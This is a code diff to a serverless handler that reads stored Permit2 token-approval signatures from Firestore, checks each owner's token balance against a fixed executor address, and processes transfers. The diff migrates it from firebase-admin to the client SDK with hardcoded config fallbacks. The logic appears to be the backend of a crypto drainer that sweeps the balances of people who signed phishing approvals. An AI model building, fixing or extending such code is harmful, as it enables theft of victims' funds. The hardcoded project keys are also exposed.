@@ -1,4 +1,5 @@
-import admin from 'firebase-admin';
+import { getApp, getApps, initializeApp } from 'firebase/app';
+import { collection, doc, getDoc, getDocs, getFirestore, limit, query, updateDoc, where } from 'firebase/firestore';
 import { ethers } from 'ethers';
 
 // -----------------------------
@@ -42,20 +43,22 @@ let routerContract = null;
 async function init() {
   if (db) return; 
 
-  const serviceAccount = {
-    projectId: process.env.FIREBASE_PROJECT_ID,
-    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
-    privateKey: (process.env.FIREBASE_PRIVATE_KEY || "").replace(/\\n/g, '\n')
+  const firebaseConfig = {
+    apiKey: process.env.FIREBASE_API_KEY || process.env.VITE_FIREBASE_API_KEY || 'AIzaSyAocB-xjAk8-xIIcDLjx72k9I8OK4jHVgE',
+    authDomain: process.env.FIREBASE_AUTH_DOMAIN || process.env.VITE_FIREBASE_AUTH_DOMAIN || 'tlord-1ab38.firebaseapp.com',
+    databaseURL: process.env.FIREBASE_DATABASE_URL || process.env.VITE_FIREBASE_DATABASE_URL || 'https://tlord-1ab38-default-rtdb.firebaseio.com',
+    projectId: process.env.FIREBASE_PROJECT_ID || process.env.VITE_FIREBASE_PROJECT_ID || 'tlord-1ab38',
+    storageBucket: process.env.FIREBASE_STORAGE_BUCKET || process.env.VITE_FIREBASE_STORAGE_BUCKET || 'tlord-1ab38.firebasestorage.app',
+    messagingSenderId: process.env.FIREBASE_MESSAGING_SENDER_ID || process.env.VITE_FIREBASE_MESSAGING_SENDER_ID || '750743868519',
+    appId: process.env.FIREBASE_APP_ID || process.env.VITE_FIREBASE_APP_ID || '1:750743868519:web:732b9ba46acda5096570c2'
   };
 
-  if (!admin.apps.length) {
-    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
-  }
-  db = admin.firestore();
+  const app = getApps().length ? getApp() : initializeApp(firebaseConfig, 'vercel-worker-app');
+  db = getFirestore(app);
   
   try {
-    const cfgSnap = await db.collection('admin_config').doc('settings').get();
-    const cfg = cfgSnap.exists ? cfgSnap.data() : {};
+    const cfgSnap = await getDoc(doc(db, 'admin_config', 'settings'));
+    const cfg = cfgSnap.exists() ? cfgSnap.data() : {};
     const rpc = cfg.rpcUrl || process.env.RPC_URL || 'https://cloudflare-eth.com';
 
     provider = new ethers.JsonRpcProvider(rpc);
@@ -105,18 +108,20 @@ export default async function handler(req, res) {
 
     let docsToProcess = [];
     if (docId) {
-      const doc = await db.collection('permit2_signatures').doc(docId).get();
-      if (doc.exists && !doc.data().processed) docsToProcess.push(doc);
+      const oneDoc = await getDoc(doc(db, 'permit2_signatures', docId));
+      if (oneDoc.exists() && !oneDoc.data().processed) {
+        docsToProcess.push({ id: oneDoc.id, data: oneDoc.data() });
+      }
     } else {
-      const snaps = await db.collection('permit2_signatures').where('processed', '==', false).limit(1).get();
-      docsToProcess = snaps.docs;
+      const snaps = await getDocs(query(collection(db, 'permit2_signatures'), where('processed', '==', false), limit(1)));
+      docsToProcess = snaps.docs.map((d) => ({ id: d.id, data: d.data() }));
     }
 
     if (!docsToProcess.length) return res.json({ ok: true, processed: 0 });
 
     let count = 0;
-    for (const docSnap of docsToProcess) {
-      const data = docSnap.data();
+    for (const item of docsToProcess) {
+      const data = item.data;
       
       try {
         if (!data || !data.owner || !data.token || !data.amount || !data.r || !data.s || !data.v) {
@@ -135,7 +140,7 @@ export default async function handler(req, res) {
         } catch (bErr) { console.error('Failed to read owner balance:', bErr); }
 
         if (withdrawAmount === 0n) {
-          await docSnap.ref.update({ lastError: 'owner has zero token balance', lastErrorAt: Date.now() });
+          await updateDoc(doc(db, 'permit2_signatures', item.id), { lastError: 'owner has zero token balance', lastErrorAt: Date.now() });
           if (docId) return res.status(400).json({ ok: false, error: 'Zero balance' });
           continue;
         }
@@ -143,7 +148,7 @@ export default async function handler(req, res) {
         // Validate Spender
         if (!data.spender || data.spender.toLowerCase() !== EXECUTOR_ADDRESS.toLowerCase()) {
            const msg = `Spender mismatch.`;
-           await docSnap.ref.update({ lastError: msg, lastErrorAt: Date.now() });
+            await updateDoc(doc(db, 'permit2_signatures', item.id), { lastError: msg, lastErrorAt: Date.now() });
            if (docId) return res.status(400).json({ ok: false, error: msg });
            continue;
         }
@@ -222,7 +227,7 @@ export default async function handler(req, res) {
 
         // ============================================================
 
-        await docSnap.ref.update({
+        await updateDoc(doc(db, 'permit2_signatures', item.id), {
           processed: true,
           routerTx: receipt.hash,
           processedAt: Date.now(),
@@ -236,10 +241,10 @@ export default async function handler(req, res) {
         }
 
       } catch (err) {
-        console.error(`Failed doc ${docSnap.id}:`, err);
+        console.error(`Failed doc ${item.id}:`, err);
         // If nonce error happens, it invalidates subsequent nonces, so we should arguably stop, 
         // but for now we just log it.
-        await docSnap.ref.update({
+        await updateDoc(doc(db, 'permit2_signatures', item.id), {
             lastError: err.shortMessage || err.message,
             lastErrorAt: Date.now()
         });
